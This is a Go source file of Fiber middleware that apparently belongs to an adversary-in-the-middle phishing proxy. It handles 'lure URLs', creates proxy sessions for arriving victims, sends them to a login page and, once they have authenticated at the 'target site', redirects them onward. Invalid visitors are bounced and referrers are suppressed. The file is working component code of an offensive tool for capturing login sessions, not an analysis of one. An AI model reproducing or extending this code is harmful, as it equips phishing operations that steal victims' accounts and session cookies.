package main

import (
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/rs/zerolog"
	"go.uber.org/multierr"
)

type AuthConfig struct {
	// URL to redirect browser in case of invalid lure URL or cookies
	InvalidAuthURL string
	// URL to redirect browser in case of valid lure URL and empty cookies
	LoginURL string
	// Service to check URLs for authentication and redirect configs
	LureService LureService
	// Manager to create/retrieve session from request cookies
	SessionManager SessionManager
	// Service to check that the user is authenticated at the target site
	AuthService AuthService
}

func NewAuthMiddleware(log *zerolog.Logger, conf AuthConfig) fiber.Handler {
	m := &authMiddleware{log: log, AuthConfig: &conf}
	return func(c *fiber.Ctx) error {
		return m.Handle(c)
	}
}

type authMiddleware struct {
	*AuthConfig
	log *zerolog.Logger
}

func (m *authMiddleware) Handle(c *fiber.Ctx) error {
	sess, err := m.SessionManager.GetSession(c)
	if err != nil {
		return err
	}
	if sess != nil {
		return m.authenticatedHandler(c, sess)
	}
	return m.loginHandler(c)
}

func (m *authMiddleware) authenticatedHandler(c *fiber.Ctx, sess *proxySession) error {
	exists, err := m.LureService.ExistsByURL(c.OriginalURL())
	if err != nil {
		return err
	}
	if exists {
		return m.authRedirect(c, sess)
	}

	setProxySession(c, sess)
	err = c.Next()
	// refresh session
	return multierr.Append(err, sess.Save())
}

func (m *authMiddleware) loginHandler(c *fiber.Ctx) error {
	lureURL := c.OriginalURL()
	exists, err := m.LureService.ExistsByURL(lureURL)
	if err != nil {
		return err
	}
	if !exists {
		return m.redirect(c, m.InvalidAuthURL)
	}
	sess, err := m.SessionManager.NewSession(c, strings.Clone(lureURL))
	if err != nil {
		return err
	}
	if err = sess.Save(); err != nil {
		return err
	}
	return m.redirect(c, m.LoginURL)
}

func (m *authMiddleware) authRedirect(c *fiber.Ctx, sess *proxySession) error {
	targetURL := m.LoginURL
	if m.AuthService.IsAuthenticated(c) {
		lure, err := m.LureService.GetByURL(sess.LureURL())
		if err != nil {
			m.log.Error().Err(err).Msg("lureService error")
		} else if lure != nil {
			targetURL = lure.TargetURL
		}
	}
	return m.redirect(c, targetURL)
}

func (*authMiddleware) redirect(c *fiber.Ctx, url string) error {
	c.Set("Referrer-Policy", "no-referrer")
	return c.Status(fiber.StatusFound).Redirect(url)
}

func NewNoAuthMiddleware(conf AuthConfig) fiber.Handler {
	m := &noAuthMiddleware{AuthConfig: &conf}
	return func(c *fiber.Ctx) error {
		return m.Handle(c)
	}
}

type noAuthMiddleware struct {
	*AuthConfig
}

func (m *noAuthMiddleware) Handle(c *fiber.Ctx) error {
	sess, err := m.SessionManager.GetOrCreateSession(c, "")
	if err != nil {
		return err
	}
	setProxySession(c, sess)
	err = c.Next()
	// refresh session
	return multierr.Append(err, sess.Save())
}

func getProxySession(c *fiber.Ctx) *proxySession {
	if sess, ok := c.Locals("proxy_session").(*proxySession); ok {
		return sess
	}
	return nil
}

func setProxySession(c *fiber.Ctx, sess *proxySession) {
	c.Locals("proxy_session", sess)
}
